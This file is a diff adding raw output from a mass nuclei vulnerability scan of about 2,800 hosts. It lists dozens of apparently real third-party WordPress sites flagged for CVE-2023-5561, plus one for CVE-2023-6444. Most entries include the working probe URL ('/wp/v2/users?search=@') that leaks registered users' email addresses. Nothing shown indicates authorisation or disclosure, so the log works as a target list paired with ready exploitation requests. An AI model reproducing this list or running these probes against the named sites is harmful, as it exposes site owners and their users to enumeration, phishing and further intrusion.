@@ -1,0 +1,73 @@
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.2.5
+
+		projectdiscovery.io
+
+[[31mWRN[0m] Found 1 templates with syntax error (use -validate flag for further examination)
+[[31mWRN[0m] Found 1 templates with runtime error (use -validate flag for further examination)
+[[34mINF[0m] Current nuclei version: v3.2.5 ([91moutdated[0m)
+[[34mINF[0m] Current nuclei-templates version: v10.4.7 ([92mlatest[0m)
+[[93mWRN[0m] Scan results upload to cloud is disabled.
+[[34mINF[0m] New templates added in latest release: 122
+[[34mINF[0m] Templates loaded for current scan: 1128
+[[34mINF[0m] Executing 1127 signed templates from projectdiscovery/nuclei-templates
+[[93mWRN[0m] Loading 1 unsigned templates for scan. Use with caution.
+[[34mINF[0m] Targets loaded for current scan: 2858
+[[34mINF[0m] Running httpx on input host
+[[34mINF[0m] Found 2764 URL from httpx
+[[34mINF[0m] Templates clustered: 151 (Reduced 360108 Requests)
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://7pcd.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://adnandemirturk.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://afterpetipa.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://agaoglunakliye.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://airgunsofkansas.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://allsexynavels.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://ankarates5.org/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://angdesh.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://alteryourmarketing.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://anthonyvincentphoto.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://avelartutoriais.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://be-mag.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://cfoman.org/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://codesdb.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://cyclicmagazine.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://cwlabtech.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://dukeandboone.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://edoutslaymemorial.org/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://flirtytexts.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://free-logo-design.net/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://gainesvillesportscommission.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://greenzay.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://greenlightservices.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://halal-world.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://hotdevelopments.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://hotpotafrica.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://hsfoundation.org/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://invistanodigital.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://investor.starsmicro.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-6444[0m] [[94mhttp[0m] [[33mmedium[0m] https://macaugeeker.com/?feed=itunes
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://jtpharmacytechtraining.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://keysnap.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://kardservice.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://khalilantoun.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://kuberhotel.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://lifeofwellness.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://macaugeeker.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://maichevietnam.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://maisumdev.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://mail.ytukampus.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://masumahmad.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://mcgillbrothers.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://milaapweddings.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://minjeng.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://moredownload.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://myboilerbuddy.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://neurongarage.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://neohairtransplant.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://nightowlinteractive.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://norwoodgov.com/wp-json/wp/v2/users?search=@ [[93mroute[0m=[93m"wp-json/wp/v2/users?"[0m]
+[[92mCVE-2023-5561[0m] [[94mhttp[0m] [[33mmedium[0m] https://omaaya.com/?rest_route=/wp/v2/users&search=@ [[93mroute[0m=[93m"?rest_route=/wp/v2/users&"[0m]
